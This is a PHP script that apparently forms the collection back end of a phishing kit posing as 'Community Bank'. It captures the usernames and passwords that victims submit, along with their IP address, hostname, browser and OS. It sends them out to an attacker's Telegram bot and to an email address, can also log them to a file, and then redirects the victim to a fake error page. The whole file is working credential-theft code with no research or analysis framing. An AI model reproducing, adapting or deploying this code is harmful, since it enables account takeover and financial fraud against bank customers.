<?php
error_reporting(0);
session_start();
include("../Functions/VSL_BROWSER.php");
include("../Functions/VSL_IP.php");
include("../edit.php");

$ip = getenv("REMOTE_ADDR");
$local_ip = $_SERVER['REMOTE_ADDR']; 
$host = gethostbyaddr($ip);

$message.="
	<h2 style='text-align: center;'>Rosco<span style='color:red;'>DC</span></h2>
	<h3 style='text-align: center'> ONLINE ACCESS </h3><br>
	<ul>
		<li>Username : ".$_POST['username']."</li><br>
		<li>Password : ".$_POST['password']."</li><br>
	</ul>
	<br>
	<h3 style='text-align: center'>IP HOSTNAME DATA</h3><br>
	<ul>
		<li>Sent from IP Address : ".$host."</li><br>
		<li>Browser Details : ".VSL_GETBROWSER($_SERVER['HTTP_USER_AGENT'])."</li><br>
		<li>OS : ".VSL_GETOS($_SERVER['HTTP_USER_AGENT'])."</li><br>
		<li>Local ip : ".getUserIP()."</li><br>
	</ul>";

$TelegramMsg.="
	[Community Bank]
	[ONLINE ACCESS]

	Username : ".$_POST['username']."
	Password : ".$_POST['password']."
	--------------------------------
	Browser Details : ".VSL_GETBROWSER($_SERVER['HTTP_USER_AGENT'])."
	OS : ".VSL_GETOS($_SERVER['HTTP_USER_AGENT'])."
	Local ip : ".getUserIP()."
";

$data = [
	'text' => ''.$TelegramMsg.'',
	'chat_id' => ''.$ChatID.''
	];
	file_get_contents("https://api.telegram.org/bot".$botToken."/sendMessage?" . http_build_query($data) );

	if($ReadFile == "on"){
		$file = fopen('../Logs/Logs.txt', 'a');
		fwrite($file, $TelegramMsg);
		fclose($file);
	}

$subject = "Community Bank [Login Access] from : ".getUserIP()."\r\n";
$headers[] = 'MIME-Version: 1.0';
$headers[] = 'Content-type: text/html; charset=iso-8859-1';
$headers[] = 'From: Community Bank <example@vslmail.com>';
$headers[] = 'To: You <user@vslmail.com>';
mail($receiver, $subject, $message,  implode("\r\n", $headers)) ? header("Location: ../Pages/error_login") : header("Location: ../Pages/index");
?>